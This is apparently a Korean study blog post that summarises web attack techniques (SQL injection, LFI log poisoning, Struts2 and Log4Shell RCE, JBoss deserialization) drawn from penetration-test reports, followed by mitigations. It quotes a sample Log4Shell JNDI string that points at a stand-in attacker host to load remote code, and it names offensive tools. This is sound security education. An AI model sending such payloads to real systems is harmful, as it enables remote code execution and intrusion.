---
layout: post
title: "ATT&CK 기반 웹 해킹 기술 및 도구 분석"
date: 2025-11-20 10:00:00 +0900
categories: [web-hacking]
---

## 개요
본 포스트는 MITRE ATT&CK 프레임워크 기반의 모의해킹 보고서를 분석하며 식별된 주요 웹 해킹 기술과 도구를 정리한 것입니다. 기존에 학습했던 내용과 비교하여 새롭게 알게 된 기술들을 중점적으로 다룹니다.

## 주요 웹 해킹 기술 (Web Hacking Techniques)

### 1. SQL Injection (SQLi)
*   **설명:** 웹 애플리케이션의 입력값 검증 부재를 악용하여 데이터베이스 쿼리를 조작하는 공격입니다.
*   **활용:** 로그인 우회, 데이터 유출, 웹 셸 업로드(`INTO OUTFILE`) 등에 사용됩니다.
*   **도구:** `sqlmap`, `Burp Suite`

### 2. Local File Inclusion (LFI) & Log Poisoning
*   **설명:** 서버의 로컬 파일을 읽어오거나 실행할 수 있는 취약점입니다.
*   **심화 기술 (Log Poisoning):** 웹 서버의 로그 파일(예: `access.log`)에 악성 PHP 코드를 삽입(User-Agent 변조 등)한 후, LFI 취약점을 통해 해당 로그 파일을 실행시켜 셸을 획득하는 기법입니다.
*   **도구:** `curl`, `Burp Suite`

### 3. Apache Struts2 RCE (CVE-2017-5638)
*   **설명:** Apache Struts2 프레임워크의 Jakarta Multipart 파서 취약점을 이용한 원격 코드 실행(RCE) 공격입니다.
*   **특징:** `Content-Type` 헤더에 OGNL(Object-Graph Navigation Language) 표현식을 삽입하여 실행합니다. 인증 없이 시스템 권한을 탈취할 수 있는 매우 치명적인 취약점입니다.

### 4. Log4Shell (CVE-2021-44228)
*   **설명:** Java 로깅 라이브러리인 Log4j의 JNDI(Java Naming and Directory Interface) 인젝션 취약점입니다.
*   **메커니즘:** 공격자가 `${jndi:ldap://attacker.com/malware}`와 같은 문자열을 로그에 남기면, 서버가 해당 LDAP 서버에 접속하여 악성 Java 객체를 다운로드하고 실행합니다.
*   **도구:** `marshalsec` (악성 LDAP/RMI 서버 구축)

### 5. JBoss/Wildfly Deserialization (CVE-2017-12149)
*   **설명:** JBoss 애플리케이션 서버의 `/invoker/JNDIFactory` 엔드포인트에서 발생하는 역직렬화 취약점입니다.
*   **도구:** `ysoserial` (악성 직렬화 페이로드 생성)

## 대응 방안
*   **입력값 검증:** 모든 사용자 입력에 대한 철저한 검증 및 이스케이프 처리.
*   **최신 패치 적용:** Struts2, Log4j, JBoss 등 프레임워크 및 라이브러리를 최신 버전으로 유지.
*   **WAF 도입:** 웹 애플리케이션 방화벽을 통해 알려진 공격 패턴 차단.
